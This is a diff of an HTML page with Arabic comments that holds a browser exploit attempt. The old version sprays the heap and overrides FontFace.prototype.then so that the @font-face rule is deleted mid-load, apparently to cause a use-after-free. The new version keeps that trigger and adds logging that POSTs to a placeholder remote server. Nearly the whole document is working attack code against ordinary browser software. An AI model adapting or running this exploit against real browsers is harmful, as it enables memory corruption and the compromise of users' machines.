@@ -1,52 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style id="target-style">
-        @font-face { font-family: 'ExploitFont'; src: url('trigger.woff2'); }
+    <style id="s">
+        @font-face { font-family: 'x'; src: url('nonexistent.woff'); }
     </style>
 </head>
 <body>
+    <h1>مراقب النظام - وضع البحث</h1>
     <script>
-        // 1. إعداد منطقة الذاكرة (Heap Grooming)
-        const SPRAY_SIZE = 1000;
-        let heapSpray = new Array(SPRAY_SIZE);
+        // إعداد الاتصال بالكونسول البعيد
+        const REMOTE_URL = "https://your-server.com/log"; // ضع رابط السيرفر هنا
 
-        function prepareHeap() {
-            for (let i = 0; i < SPRAY_SIZE; i++) {
-                // نخصص مصفوفات بنفس حجم كائن CSSFontFace التقريبي
-                // لمحاولة تعبئة الثغرات التي يتركها الـ GC
-                heapSpray[i] = new Uint32Array(0x400); 
-            }
+        function remoteLog(msg) {
+            fetch(REMOTE_URL, {
+                method: 'POST',
+                body: JSON.stringify({ log: msg, time: new Date().toLocaleTimeString() })
+            });
         }
 
-        // 2. دالة تشغيل الثغرة (Triggering)
-        async function runExploit() {
-            prepareHeap();
+        window.onload = async () => {
+            remoteLog("بدء تشغيل عملية الاختبار...");
 
-            const font = new FontFace("ExploitFont", "url(exploit.woff2)");
-            document.fonts.add(font);
-            const loadPromise = font.load();
-
-            // اعتراض عملية الـ Promise لشن الهجوم في لحظة حرجة
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
+            
             Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
                 get() {
-                    // هنا يتم حذف القاعدة أثناء التحميل
-                    document.getElementById('target-style').sheet.deleteRule(0);
-                    // Force Layout لتحفيز تغييرات الذاكرة
-                    document.body.offsetTop;
+                    remoteLog("تم اعتراض الـ Promise - بدء الثغرة");
+                    document.getElementById('s').sheet.deleteRule(0);
                     return undefined;
                 }
             });
 
             try {
-                await loadPromise;
+                document.fonts.load('1em x', 'AB');
+                remoteLog("تم استدعاء load بنجاح");
             } catch (e) {
-                console.log("تم رصد محاولة التلاعب بالذاكرة.");
+                remoteLog("خطأ في التنفيذ: " + e.message);
             }
-        }
-
-        // تشغيل العملية
-        window.onload = runExploit;
+        };
     </script>
 </body>
 </html>
